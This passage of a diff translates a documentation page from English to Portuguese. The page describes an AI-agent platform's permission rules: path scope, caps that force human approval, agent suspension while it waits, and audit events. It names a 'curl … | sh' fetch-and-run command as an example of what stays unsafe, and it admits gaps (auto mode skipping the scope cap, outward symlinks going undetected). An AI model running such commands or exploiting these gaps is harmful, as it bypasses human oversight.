+verbo (<a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055</a>,
+<a href="../business-rules/api.html#rn-075">RN-075</a>). A pasta do projeto —
+<code>&lt;PROJECT_WORKSPACES_ROOT&gt;/&lt;workspace_dir_name&gt;</code>, onde moram o
+<code>permissions.json</code> e todos os worktrees dos agentes — é o <strong>escopo</strong>.
+<code>workspace_dir_name</code>
 (<a href="../adr/0066-nome-de-pasta-legivel-do-workspace.html">ADR 0066</a>,
-<a href="../business-rules/api.html#rn-109">RN-109</a>) is the folder name frozen at
-project creation — readable (<code>&lt;slug&gt;-&lt;8 chars of the id&gt;</code>) in a new
-project, the plain UUID in a project from before that change.</p>
-<p><strong>A project in <code>local</code> mode has a different scope, and the difference
-matters here</strong> (<a href="../adr/0072-projeto-local-ou-container.html">ADR 0072</a>,
+<a href="../business-rules/api.html#rn-109">RN-109</a>) é o nome da pasta
+congelado na criação do projeto — legível (<code>&lt;slug&gt;-&lt;8 caracteres do id&gt;</code>) num
+projeto novo, o UUID puro num projeto de antes dessa mudança.</p>
+<p><strong>Um projeto em modo <code>local</code> tem um escopo diferente, e a diferença importa
+aqui</strong> (<a href="../adr/0072-projeto-local-ou-container.html">ADR 0072</a>,
 <a href="../business-rules/api.html#rn-169">RN-169</a>/<a href="../business-rules/api.html#rn-170">RN-170</a>):
-the root becomes the <strong>absolute path the user typed at creation</strong>, not
+a raiz passa a ser o <strong>caminho absoluto que o usuário digitou na criação</strong>, não
 <code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>.</p>
-<p>Everything this section describes still holds — the scope tightens and
-loosens exactly the same way, and <code>deny</code> still wins first. What changes is
-what it CONTAINS. And the consequence is declared without softening in ADR
-0072: the <strong>structural</strong> containment of the <code>join</code> — &quot;the result never
-leaves the managed root, whatever happens to the column&quot; — ceases to exist
-for these projects. What replaces it is the creation-time validation
-(RN-170: absolute, no <code>..</code>, existing, writable, never a system root, never
-overlapping the Brabo checkout), plus the LEXICAL revalidation of the same
-predicate on every derivation of the root — so that a row tampered with
-directly in the database doesn't turn into a terminal scope at <code>/</code>.</p>
-<p>Path comparison is <strong>lexical and without regex over the input</strong>: trimming
-trailing slashes is an O(n) scan, not <code>.replace(/\/+$/, '')</code>. The old
-pattern was flagged by CodeQL as polynomial ReDoS (HIGH) — it forces the
-engine to try every starting position, and degrades to O(n²) with many
-slashes. The input here comes from an agent command, so it's not a place
-for backtracking regex.</p>
-<p>The scope does two opposite things, and it's the combination that matters:</p>
-<p><strong>Tightens.</strong> A command that touches a path from outside is never
-auto-approved, no matter how much the verb is in <code>allow</code>. Without this, an
-allowed <code>Terminal(cat)</code> would auto-execute <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — the platform
-code that runs the agent — and reach into other projects' worktrees.</p>
-<p><strong>Loosens.</strong> Within the scope, <code>cd</code> stops being a verb that needs
-permission: it's the scope declaration itself. Without this, the dev
-agent, which always emits <code>cd &lt;caminho&gt; &amp;&amp; &lt;verbo&gt;</code>, would run into the
-compound-command rule — every segment needs to match — and <strong>every</strong>
-command would stop for approval, no matter how much the verb was allowed.</p>
-<p>Four limits worth understanding:</p>
+<p>Tudo o que esta seção descreve continua valendo — o escopo aperta e afrouxa
+exatamente do mesmo jeito, e <code>deny</code> continua vencendo primeiro. O que muda é o
+que ele CONTÉM. E a consequência é declarada sem atenuação no ADR 0072: a
+contenção <strong>estrutural</strong> do <code>join</code> — &quot;o resultado nunca sai da raiz gerenciada,
+aconteça o que acontecer com a coluna&quot; — deixa de existir para esses projetos.
+O que a substitui é a validação na criação (RN-170: absoluto, sem <code>..</code>,
+existente, gravável, nunca uma raiz de sistema, nunca sobreposto ao checkout do
+Brabo), mais a revalidação LÉXICA do mesmo predicado em toda derivação da raiz
+— para que uma linha adulterada direto no banco não vire um escopo de terminal
+em <code>/</code>.</p>
+<p>A comparação de caminho é <strong>léxica e sem regex sobre a entrada</strong>: aparar barras
+finais é uma varredura O(n), não <code>.replace(/\/+$/, '')</code>. O padrão antigo foi
+apontado pelo CodeQL como ReDoS polinomial (HIGH) — ele força o motor a tentar
+toda posição inicial, e degrada para O(n²) com muitas barras. A entrada aqui
+vem de um comando de agente, então não é lugar para regex com backtracking.</p>
+<p>O escopo faz duas coisas opostas, e é a combinação que importa:</p>
+<p><strong>Aperta.</strong> Um comando que toca um caminho de fora nunca é auto-aprovado, por
+mais que o verbo esteja no <code>allow</code>. Sem isso, um <code>Terminal(cat)</code> permitido
+auto-executaria <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — o código da
+plataforma que roda o agente — e alcançaria os worktrees de outros projetos.</p>
+<p><strong>Afrouxa.</strong> Dentro do escopo, <code>cd</code> deixa de ser verbo que precisa de
+permissão: ele é a própria declaração do escopo. Sem isso, o dev agent, que
+sempre emite <code>cd &lt;caminho&gt; &amp;&amp; &lt;verbo&gt;</code>, esbarraria na regra do comando
+composto — todo segmento precisa casar — e <strong>todo</strong> comando pararia para
+aprovação, por mais que o verbo estivesse permitido.</p>
+<p>Quatro limites que vale entender:</p>
 <ul>
-<li><strong>Scope permits, it doesn't exempt.</strong> Being in the project folder
-doesn't make <code>curl … | sh</code> safe: a verb outside <code>allow</code> still requires
-approval.</li>
-<li><strong>Outside the scope is <code>require_approval</code>, not <code>deny</code>.</strong> The agent may
-have a legitimate reason to look outside; who decides remains you.</li>
-<li><strong>Auto mode skips this cap.</strong> An agent with the <code>&quot;*&quot;: auto_approve</code>
-wildcard runs commands outside the scope without asking
-(<a href="../business-rules/api.html#rn-603">RN-603</a>); turning the agent
-card back to &quot;manual&quot; restores it.</li>
-<li><strong>Normalization is lexical, not <code>realpath</code>.</strong> <code>&lt;raiz&gt;/../..</code> is resolved
-and rejected; a symbolic link inside the project pointing outward is
-<strong>not</strong> detected. Scope is policy, not isolation.</li>
+<li><strong>Escopo permite, não isenta.</strong> Estar na pasta do projeto não torna
+<code>curl … | sh</code> seguro: um verbo fora do <code>allow</code> continua exigindo aprovação.</li>
+<li><strong>Fora do escopo é <code>require_approval</code>, não <code>deny</code>.</strong> O agente pode ter um
+motivo legítimo para olhar fora; quem decide continua sendo você.</li>
+<li><strong>O modo automático pula este teto.</strong> Um agente com a curinga
+<code>&quot;*&quot;: auto_approve</code> roda comandos fora do escopo sem perguntar
+(<a href="../business-rules/api.html#rn-603">RN-603</a>); voltar o card do
+agente para &quot;manual&quot; o restaura.</li>
+<li><strong>A normalização é léxica, não <code>realpath</code>.</strong> <code>&lt;raiz&gt;/../..</code> é resolvido e
+rejeitado; um link simbólico dentro do projeto apontando para fora <strong>não</strong> é
+detectado. Escopo é política, não isolamento.</li>
 </ul>
-<p>Which tokens are checked: <strong>absolute</strong> ones (start with <code>/</code>) and ones that
-contain <code>..</code>. A relative one without <code>..</code> resolves under the <code>cwd</code>, which
-was already checked — and treating <code>-maxdepth</code>, <code>4</code>, or <code>*.ex</code> as a path
-would reject a legitimate command without gaining any security.</p>
-<p>Two properties that fall out of this:</p>
-<p><strong><code>deny</code> wins immediately.</strong> No matter what stage it appears in, it
-returns right away. There's no configuration that reverts a <code>deny</code>.</p>
-<p><strong>A silent stage never downgrades.</strong> If <code>agent_autonomy</code> said
-<code>auto_approve</code> and <code>permissions.json</code> has no rule for that action, the
-result stays <code>auto_approve</code> — the file doesn't &quot;vote against&quot; by
-omission. Each stage can only raise the permissiveness of the previous
-one.</p>
-<h2 id="caps">Caps</h2>
-<p>Applied <strong>last</strong>, after everything else:</p>
+<p>Quais tokens são conferidos: os <strong>absolutos</strong> (começam com <code>/</code>) e os que
+contêm <code>..</code>. Um relativo sem <code>..</code> resolve abaixo do <code>cwd</code>, que já foi conferido
+— e tratar <code>-maxdepth</code>, <code>4</code> ou <code>*.ex</code> como caminho rejeitaria um comando
+legítimo sem ganhar segurança nenhuma.</p>
+<p>Duas propriedades que decorrem disto:</p>
+<p><strong><code>deny</code> vence na hora.</strong> Não importa em que etapa apareça, ele devolve na
+hora. Não há configuração que reverta um <code>deny</code>.</p>
+<p><strong>Etapa calada nunca rebaixa.</strong> Se o <code>agent_autonomy</code> disse <code>auto_approve</code> e o
+<code>permissions.json</code> não tem regra para aquela ação, o resultado continua
+<code>auto_approve</code> — o arquivo não &quot;vota contra&quot; por omissão. Cada etapa só pode
+subir a permissividade da anterior.</p>
+<h2 id="caps">Tetos</h2>
+<p>Aplicados <strong>por último</strong>, depois de todo o resto:</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>cap</th>
-<th>effect</th>
-<th>why</th>
+<th>teto</th>
+<th>efeito</th>
+<th>por quê</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>git_merge</code> with destination in <code>dev</code>, <code>qa</code>, <code>rc</code> or <code>main</code></td>
+<td><code>git_merge</code> com destino em <code>dev</code>, <code>qa</code>, <code>rc</code> ou <code>main</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>merge into a protected branch is always your decision (<a href="../business-rules/api.html#rn-006">RN-006</a>)</td>
+<td>merge em branch protegida é sempre decisão sua (<a href="../business-rules/api.html#rn-006">RN-006</a>)</td>
 </tr>
 <tr>
 <td><code>instruction_patch</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>you need to see the diff before one agent changes another's behavior (<a href="../business-rules/api.html#rn-007">RN-007</a>)</td>
+<td>você precisa ver o diff antes de um agente mudar o comportamento de outro (<a href="../business-rules/api.html#rn-007">RN-007</a>)</td>
 </tr>
 <tr>
-<td><code>parallelize</code> and <code>raise_max_parallel</code></td>
+<td><code>parallelize</code> e <code>raise_max_parallel</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>spending on more agents is your decision; without this cap the lead's limit would be decorative, and raising the cap itself would be the product raising its own spending limit (<a href="../business-rules/api.html#rn-086">RN-086</a>)</td>
+<td>gastar com mais agentes é decisão sua; sem este teto o limite do lead seria decorativo, e subir o próprio teto seria o produto subindo o próprio limite de gasto (<a href="../business-rules/api.html#rn-086">RN-086</a>)</td>
 </tr>
 <tr>
-<td><code>terminal</code> with external-effect git (push/PR/deploy) or <code>sudo</code>/<code>doas</code></td>
+<td><code>terminal</code> com git de efeito externo (push/PR/deploy) ou <code>sudo</code>/<code>doas</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>external-effect git and privileged commands are never auto-approvable, even with &quot;automatic mode&quot; on (<a href="../business-rules/api.html#rn-418">RN-418</a>, revises <a href="../business-rules/api.html#rn-106">RN-106</a>) — see the dedicated section above</td>
+<td>git com efeito externo e comandos privilegiados nunca são auto-aprováveis, nem com o &quot;modo automático&quot; ligado (<a href="../business-rules/api.html#rn-418">RN-418</a>, revisa a <a href="../business-rules/api.html#rn-106">RN-106</a>) — veja a seção dedicada acima</td>
 </tr>
 <tr>
-<td>typed <code>git_push</code> and <code>pr_open</code></td>
+<td><code>git_push</code> e <code>pr_open</code> tipados</td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>the same RN-418 cap through the typed door: neither the auto-mode wildcard, nor a specific <code>agent_autonomy</code> rule, nor <code>permissions.json</code> promotes them (<a href="../business-rules/api.html#rn-689">RN-689</a>). <code>git_merge</code> keeps its own cap (first row); <code>deploy</code> is not a <code>proposed_action</code> type</td>
+<td>o mesmo teto da RN-418 pela porta tipada: nem a curinga do modo automático, nem uma regra específica de <code>agent_autonomy</code>, nem o <code>permissions.json</code> os promovem (<a href="../business-rules/api.html#rn-689">RN-689</a>). <code>git_merge</code> mantém o teto próprio (primeira linha); <code>deploy</code> não é tipo de <code>proposed_action</code></td>
 </tr>
 <tr>
 <td><code>container_remove</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>discarding a container forces a full reprovision — the same caliber as merging into a protected branch, decided every time, never configured once (<a href="../business-rules/api.html#rn-495">RN-495</a>)</td>
+<td>descartar um container força um reprovisionamento completo — mesmo calibre de mergear em branch protegida, decidido toda vez, nunca configurado uma vez (<a href="../business-rules/api.html#rn-495">RN-495</a>)</td>
 </tr>
 </tbody>
 </table></div>
-<p>A cap downgrades <code>auto_approve</code> to <code>require_approval</code>; it does <strong>not</strong>
-turn <code>deny</code> into something else, because <code>deny</code> would have already
-returned earlier.</p>
-<div class="admonicao admonicao-note" data-admonicao="note"><p class="admonicao-titulo">Why `rc` is still on the list</p>
-<p>The <code>rc</code> rung left the branch policy
-(<a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030</a>) and the
-bootstrap stopped creating it (<a href="../business-rules/api.html#rn-029">RN-029</a>) —
-but it's still here, in <code>domain/actions/protected-branches.ts</code>.</p>
-<p>This list decides what the merge lock <strong>refuses</strong>, and repositories
-bootstrapped by earlier versions of Brabo still have the branch. Removing
-it from here wouldn't remove anything from anyone's repository: it would
-only make a <code>git_merge</code> with destination <code>rc</code> auto-approvable, on a branch
-someone might be using as production.</p>
-<p>Protecting a branch that doesn't exist costs nothing. Unprotecting one
-that exists costs dearly — and the asymmetry is deliberate.</p>
+<p>Um teto rebaixa <code>auto_approve</code> para <code>require_approval</code>; ele <strong>não</strong> transforma
+<code>deny</code> em outra coisa, porque o <code>deny</code> já teria devolvido antes.</p>
+<div class="admonicao admonicao-note" data-admonicao="note"><p class="admonicao-titulo">Por que `rc` continua na lista</p>
+<p>O degrau <code>rc</code> saiu da política de branches
+(<a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030</a>) e o bootstrap
+parou de criá-lo (<a href="../business-rules/api.html#rn-029">RN-029</a>) — mas ele continua
+aqui, em <code>domain/actions/protected-branches.ts</code>.</p>
+<p>Esta lista decide o que a trava de merge <strong>recusa</strong>, e repositórios
+bootstrapados por versões anteriores do Brabo ainda têm a branch. Tirá-la daqui
+não tiraria nada do repositório de ninguém: só tornaria auto-aprovável um
+<code>git_merge</code> com destino <code>rc</code>, numa branch que alguém pode estar usando como
+produção.</p>
+<p>Proteger uma branch que não existe não custa nada. Desproteger uma que existe
+custa caro — e a assimetria é deliberada.</p>
 </div>
-<p>The difference between a cap and a default: the default is what happens
-when nobody configured anything; the cap is what happens <strong>regardless</strong> of
-what was configured.</p>
-<h2 id="what-happens-to-the-agent-while-the-decision-doesnt-come">What happens to the agent while the decision doesn't come</h2>
-<p>A <code>pending</code> action isn't just a row waiting for a click: on the other side
-there's an agent stopped.</p>
-<p>When the tool it called becomes pending, its loop <strong>suspends</strong>, holding on
-to the task, the worktree, and the conversation history, and it enters
-<code>awaiting_approval</code>. Your decision emits <code>task.action_settled</code>, which
-wakes it up: the real result of the command takes the place where the
-response would be, and the loop resumes from where it stopped.</p>
-<p><strong>Refusing also responds.</strong> The reason takes the place of the result, and
-the agent learns that path is closed instead of waiting forever — denying
-doesn't leave it stuck.</p>
-<p>This matters for whoever operates: approving late doesn't waste the work
-already done, and the approval queue isn't asynchronous for convenience —
-it's literally what the agent is waiting for. Before this, <code>pending</code> came
-back as if it were the command's response, and the agent burned its
-iteration cap trying something else until the task died without a single
-line written (<a href="../business-rules/engine.html#rn-073">RN-073</a>).</p>
-<p><strong>With one exception: engine restart.</strong> The suspended loop lives in
-memory, so a restart takes it down with it. In that case the task does
-<strong>not</strong> stay waiting: it goes back to the blocked queue, with the reason
-and origin <code>infra</code> in the event log, and a decision made after that has
-nowhere left to be applied — the decided action stays recorded, but the
-turn that was waiting for it no longer exists. If you approved and nothing
-happened, this is the first place to look.</p>
-<p>Auto-approval doesn't go through here: it executes at the proposal and the
-result comes back in the same turn — which is exactly the value of having
-the patterns from the previous section.</p>
-<p><strong>The Dev Lead suspends the same way, with one difference on restart</strong>
-(ADR 0086, <a href="../business-rules/engine.html#rn-284">RN-284</a>). It's conversational, it
-has no worktree or task — what suspends is the turn's synchronous
-<code>handle_call</code>, via <code>agent.status: awaiting_approval</code>. Unlike the dev
-agent, it does NOT have a queue to return to on an engine restart: the
-decision remains recorded and visible in Approvals, but the Dev Lead
-doesn't narrate the outcome on its own — the process that was waiting
-died, and the next restart brings up a new Dev Lead, with no subscription
-for that action. An accepted and declared gap, not a disguised one.</p>
-<h2 id="what-gets-written-for-each-decision">What gets written for each decision</h2>
-<p>Every proposed action and every decision about it become a <strong>domain
-event</strong> in <code>session_events</code>, with the real actor
+<p>A diferença entre teto e padrão: o padrão é o que acontece quando ninguém
+configurou nada; o teto é o que acontece <strong>independentemente</strong> do que foi
+configurado.</p>
+<h2 id="o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem">O que acontece com o agente enquanto a decisão não vem</h2>
+<p>Uma ação <code>pending</code> não é só uma linha esperando um clique: do outro lado há um
+agente parado.</p>
+<p>Quando a ferramenta que ele chamou fica pendente, o laço dele <strong>suspende</strong>,
+segurando a tarefa, o worktree e o histórico da conversa, e ele entra em
+<code>awaiting_approval</code>. A sua decisão emite <code>task.action_settled</code>, que o acorda:
+o resultado real do comando ocupa o lugar onde estaria a resposta, e o laço
+retoma de onde parou.</p>
+<p><strong>Recusar também responde.</strong> O motivo ocupa o lugar do resultado, e o agente
+aprende que aquele caminho está fechado em vez de esperar para sempre — negar
+não o deixa travado.</p>
+<p>Isso importa para quem opera: aprovar tarde não desperdiça o trabalho já
+feito, e a fila de aprovação não é assíncrona por conveniência — ela é
+literalmente o que o agente está esperando. Antes disso, <code>pending</code> voltava
+como se fosse a resposta do comando, e o agente queimava o teto de iterações
+tentando outra coisa até a tarefa morrer sem uma linha escrita
+(<a href="../business-rules/engine.html#rn-073">RN-073</a>).</p>
+<p><strong>Com uma exceção: reinício do engine.</strong> O laço suspenso mora em memória,
+então um reinício o derruba junto. Nesse caso a tarefa <strong>não</strong> fica esperando:
+ela volta para a fila de bloqueadas, com o motivo e origem <code>infra</code> no event
+log, e uma decisão tomada depois disso não tem mais onde ser aplicada — a ação
+decidida fica registrada, mas o turno que a esperava não existe mais. Se você
+aprovou e nada aconteceu, este é o primeiro lugar a olhar.</p>
+<p>A auto-aprovação não passa por aqui: ela executa na proposta e o resultado
+volta no mesmo turno — que é exatamente o valor de ter os padrões da seção
+anterior.</p>
+<p><strong>O Dev Lead suspende do mesmo jeito, com uma diferença no reinício</strong>
+(ADR 0086, <a href="../business-rules/engine.html#rn-284">RN-284</a>). Ele é conversacional, não
+tem worktree nem tarefa — o que suspende é o <code>handle_call</code> síncrono do turno,
+via <code>agent.status: awaiting_approval</code>. Diferente do dev agent, ele NÃO tem fila
+para onde voltar num reinício do engine: a decisão continua registrada e
+visível em Aprovações, mas o Dev Lead não narra o desfecho sozinho — o processo
+que esperava morreu, e o próximo reinício sobe um Dev Lead novo, sem inscrição
+para aquela ação. Uma lacuna aceita e declarada, não disfarçada.</p>
+<h2 id="o-que-é-gravado-em-cada-decisão">O que é gravado em cada decisão</h2>
+<p>Toda ação proposta e toda decisão sobre ela viram um <strong>evento de domínio</strong> em
+<code>session_events</code>, com o ator real
 (<a href="../business-rules/api.html#rn-049">RN-049</a>):</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>event</th>
-<th>actor</th>
-<th>when</th>
+<th>evento</th>
+<th>ator</th>
+<th>quando</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>proposed_action.created</code></td>
-<td>the <strong>agent</strong> that proposed it</td>
-<td>always, before any execution. <code>payload.status</code> says how the action was born: <code>pending</code>, <code>auto_approved</code>, or <code>denied</code>; <code>payload.reason</code> says which rule of <code>decide()</code> produced it (<a href="../business-rules/api.html#rn-567">RN-567</a>)</td>
+<td>o <strong>agente</strong> que a propôs</td>
+<td>sempre, antes de qualquer execução. <code>payload.status</code> diz como a ação nasceu: <code>pending</code>, <code>auto_approved</code> ou <code>denied</code>; <code>payload.reason</code> diz qual regra de <code>decide()</code> a produziu (<a href="../business-rules/api.html#rn-567">RN-567</a>)</td>
 </tr>
 <tr>
 <td><code>proposed_action.approved</code></td>
-<td>the <strong>user</strong> who clicked</td>
-<td>only on manual approval (including <code>approve_always</code>)</td>
+<td>o <strong>usuário</strong> que clicou</td>
+<td>só na aprovação manual (inclusive <code>approve_always</code>)</td>
 </tr>
 <tr>
 <td><code>permission.granted</code></td>
-<td>the <strong>user</strong> who clicked &quot;always allow&quot;</td>
-<td>only when the click actually recorded a pattern — <code>payload.patterns</code> (the patterns recorded, one per segment, <a href="../business-rules/api.html#rn-675">RN-675</a>) and <code>payload.pattern</code> (the same list joined by &quot;, &quot;), or <code>payload.agentId</code>/<code>actionType</code> for a module dev agent (<a href="../business-rules/api.html#rn-642">RN-642</a>)</td>
+<td>o <strong>usuário</strong> que clicou em &quot;sempre permitir&quot;</td>
+<td>só quando o clique gravou de fato um padrão — <code>payload.patterns</code> (os padrões gravados, um por segmento, <a href="../business-rules/api.html#rn-675">RN-675</a>) e <code>payload.pattern</code> (a mesma lista unida por &quot;, &quot;), ou <code>payload.agentId</code>/<code>actionType</code> para um dev agent de módulo (<a href="../business-rules/api.html#rn-642">RN-642</a>)</td>
 </tr>
 <tr>
 <td><code>proposed_action.denied</code></td>
-<td>the <strong>user</strong> who refused</td>
-<td>with <code>payload.reason</code></td>
+<td>o <strong>usuário</strong> que recusou</td>
+<td>com <code>payload.reason</code></td>
 </tr>
 <tr>
 <td><code>action.executed</code> / <code>action.failed</code></td>
 <td><code>system</code></td>
-<td>execution outcome</td>
+<td>desfecho da execução</td>
 </tr>
 </tbody>
 </table></div>
-<p>From this comes the only reliable way to separate the two things this
-document describes:</p>
+<p>Daí sai o único jeito confiável de separar as duas coisas que este documento
+descreve:</p>
 <ul>
-<li><strong>human decision</strong> = count <code>proposed_action.approved</code> events;</li>
-<li><strong>policy decision</strong> = <code>proposed_action.created</code> with <code>status: auto_approved</code> and an agent actor. It never produces a <code>.approved</code>, and
-so it's never confused with a click. Its <code>reason</code> says <strong>which</strong> rule
-auto-approved — <code>agent_autonomy: auto_approve</code>, a <code>permissions.json allow</code>
-line, the container floor, <code>escopo: cd dentro da pasta do projeto</code> — in
-the exact wording <code>decide()</code> uses. Events recorded before
-<a href="../business-rules/api.html#rn-567">RN-567</a> have no <code>reason</code>: read that as &quot;not
-recorded&quot;, not as &quot;no rule&quot;. The reason names the rule, not the scope
-root; since <a href="../business-rules/api.html#rn-609">RN-609</a> a <code>terminal</code> action's
-event also carries <code>scopeRoot</code> — the execution mode plus a RELATIVE
-identifier of the root the path scope compared against (the
-<code>workspace_dir_name</code> in <code>container</code>/<code>runner</code>, the segment under
-<code>BRABO_PROJECTS_BASE</code> in <code>mounted</code>), never the absolute path, which would
-expose the user's <code>$HOME</code> to every member. The outbox row carries neither
-<code>reason</code> nor <code>scopeRoot</code> — no engine consumer reads them. Since
-<a href="../business-rules/web.html#rn-614">RN-614</a> the UI shows both, in one sentence
-built by one function: on the event's line in the session log panel and on
-the approval card (session chat and the Approvals tab queue). An older
-event says &quot;not recorded&quot;, and the card says so when the event is outside
-the events loaded on that screen.</li>
+<li><strong>decisão humana</strong> = contar eventos <code>proposed_action.approved</code>;</li>
+<li><strong>decisão de política</strong> = <code>proposed_action.created</code> com <code>status: auto_approved</code> e ator agente. Ela nunca produz um <code>.approved</code>, e por isso
+nunca se confunde com um clique. O <code>reason</code> dela diz <strong>qual</strong> regra
+auto-aprovou — <code>agent_autonomy: auto_approve</code>, uma linha <code>allow</code> do
+<code>permissions.json</code>, o piso do container, <code>escopo: cd dentro da pasta do projeto</code> — no texto exato que <code>decide()</code> usa. Eventos gravados antes da
+<a href="../business-rules/api.html#rn-567">RN-567</a> não têm <code>reason</code>: leia isso como &quot;não
+registrado&quot;, não como &quot;nenhuma regra&quot;. O motivo nomeia a regra, não a raiz
+do escopo; desde a <a href="../business-rules/api.html#rn-609">RN-609</a> o evento de uma ação
+<code>terminal</code> leva também <code>scopeRoot</code> — o modo de execução mais um
+identificador RELATIVO da raiz contra a qual o escopo de caminho comparou (o
+<code>workspace_dir_name</code> em <code>container</code>/<code>runner</code>, o segmento abaixo de
+<code>BRABO_PROJECTS_BASE</code> em <code>mounted</code>), nunca o caminho absoluto, que exporia o
+<code>$HOME</code> do usuário a todo membro. A linha do outbox não leva nem <code>reason</code> nem
+<code>scopeRoot</code> — nenhum consumidor do engine os lê. Desde a
+<a href="../business-rules/web.html#rn-614">RN-614</a> a tela mostra os dois, numa frase
+montada por uma função só: na linha do evento no painel de log da sessão e no
+card de aprovação (chat da sessão e fila da aba Aprovações). Um evento mais
+antigo diz &quot;não registrado&quot;, e o card diz isso quando o evento está fora dos
+eventos carregados naquela tela.</li>
 </ul>
-<p>This wasn't true until Phase 12e. The first three rows went <strong>only to the
-outbox</strong>, which is transport — drained, marked with <code>processed_at</code>, and
-pruned — and the decision survived only in <code>proposed_actions.decided_at</code>,
-a column outside the timeline that the UI, the Psychologist, and the
-Anamnesis read. The practical result was that &quot;how many times did the
-human approve&quot; couldn't be answered in the Phase 10 dogfooding, which was
-exactly that experiment's main metric.</p>
-<p>Repository bootstrap is the deliberate exception: the mutations it
-proposes don't emit <code>proposed_action.created</code> in the log, because they're
-already narrated by <code>bootstrap.step_*</code> in the same session — counting them
-again would inflate the approval metric with work nobody approved.</p>
+<p>Isso não era verdade até a Fase 12e. As três primeiras linhas iam <strong>só para o
+outbox</strong>, que é transporte — drenado, marcado com <code>processed_at</code> e podado — e
+a decisão sobrevivia só em <code>proposed_actions.decided_at</code>, uma coluna fora da
+timeline que a tela, o Psicólogo e a Anamnese leem. O resultado prático foi
+que &quot;quantas vezes o humano aprovou&quot; não pôde ser respondido no dogfooding da
+Fase 10, que era exatamente a métrica principal daquele experimento.</p>
+<p>O bootstrap de repositório é a exceção deliberada: as mutações que ele propõe
+não emitem <code>proposed_action.created</code> no log, porque já são narradas por
+<code>bootstrap.step_*</code> na mesma sessão — contá-las de novo inflaria a métrica de
+aprovação com trabalho que ninguém aprovou.</p>
 <nav class="site-pager"><a href="../reference/events.html">Eventos</a><a href="../reference/artifacts.html">Artefatos</a></nav>
 </article>
 <footer class="site-foot"><a href="https://github.com/viralabs-dev/brabo-api/blob/dev/docs/reference/permissions.md">Редактировать страницу</a></footer>
 </main>
-<aside class="site-toc"><h2>На этой странице</h2><ul><li class="n2"><a href="#the-file">The file</a></li><li class="n3"><a href="#with-which-credential-the-auto-approved-action-executes">With which credential the auto-approved action executes</a></li><li class="n2"><a href="#the-pattern-format">The pattern format</a></li><li class="n2"><a href="#how-a-pattern-matches-a-command">How a pattern matches a command</a></li><li class="n2"><a href="#compound-command">Compound command</a></li><li class="n2"><a href="#built-in-patterns">Built-in patterns</a></li><li class="n2"><a href="#what-activating-execution-seeds">What activating execution seeds</a></li><li class="n2"><a href="#the-complete-decision-order">The complete decision order</a></li><li class="n3"><a href="#auto-mode-the-agent_autonomy-wildcard-rn-153">&quot;Auto mode&quot;: the agent_autonomy wildcard (RN-153)</a></li><li class="n3"><a href="#the-container-floor-rn-492rn-493-adr-0134">The container floor (RN-492/RN-493, ADR 0134)</a></li><li class="n2"><a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">The boundary of external effect and privileged command (RN-418)</a></li><li class="n2"><a href="#path-scope">Path scope</a></li><li class="n2"><a href="#caps">Caps</a></li><li class="n2"><a href="#what-happens-to-the-agent-while-the-decision-doesnt-come">What happens to the agent while the decision doesn't come</a></li><li class="n2"><a href="#what-gets-written-for-each-decision">What gets written for each decision</a></li></ul></aside>
+<aside class="site-toc"><h2>На этой странице</h2><ul><li class="n2"><a href="#o-arquivo">O arquivo</a></li><li class="n3"><a href="#com-qual-credencial-a-ação-auto-aprovada-executa">Com qual credencial a ação auto-aprovada executa</a></li><li class="n2"><a href="#o-formato-do-padrão">O formato do padrão</a></li><li class="n2"><a href="#como-um-padrão-casa-com-um-comando">Como um padrão casa com um comando</a></li><li class="n2"><a href="#comando-composto">Comando composto</a></li><li class="n2"><a href="#padrões-embutidos">Padrões embutidos</a></li><li class="n2"><a href="#o-que-a-ativação-da-execução-semeia">O que a ativação da execução semeia</a></li><li class="n2"><a href="#a-ordem-completa-da-decisão">A ordem completa da decisão</a></li><li class="n3"><a href="#modo-automático-a-curinga-do-agent_autonomy-rn-153">&quot;Modo automático&quot;: a curinga do agent_autonomy (RN-153)</a></li><li class="n3"><a href="#o-piso-do-container-rn-492rn-493-adr-0134">O piso do container (RN-492/RN-493, ADR 0134)</a></li><li class="n2"><a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">A fronteira de efeito externo e comando privilegiado (RN-418)</a></li><li class="n2"><a href="#path-scope">Escopo de caminho</a></li><li class="n2"><a href="#caps">Tetos</a></li><li class="n2"><a href="#o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem">O que acontece com o agente enquanto a decisão não vem</a></li><li class="n2"><a href="#o-que-é-gravado-em-cada-decisão">O que é gravado em cada decisão</a></li></ul></aside>
 </div>
 <script src="../../assets/mermaid.min.js"></script>
 <script src="../../assets/site.js"></script>
